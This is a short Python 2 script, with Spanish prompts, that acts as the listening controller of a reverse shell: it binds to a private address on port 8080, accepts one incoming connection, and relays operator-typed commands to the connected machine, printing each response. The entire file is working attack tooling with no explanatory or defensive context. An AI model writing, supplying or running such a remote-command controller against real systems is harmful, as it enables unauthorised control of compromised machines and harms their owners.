import socket

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("192.168.1.111", 8080))
    s.listen(1)

    print('[+] Escucha de cualquier conexion TCP 8080')
    conn, addr = s.accept()
    print('[+] conectado a: ', addr)

    while True:
	command = raw_input('Shell~ $ ')
	if 'close' in command:
		conn.send('close')
		conn.close()
		break
	else:
		conn.send(command)
		print conn.recv(1024)

def main():
    connect()
main()
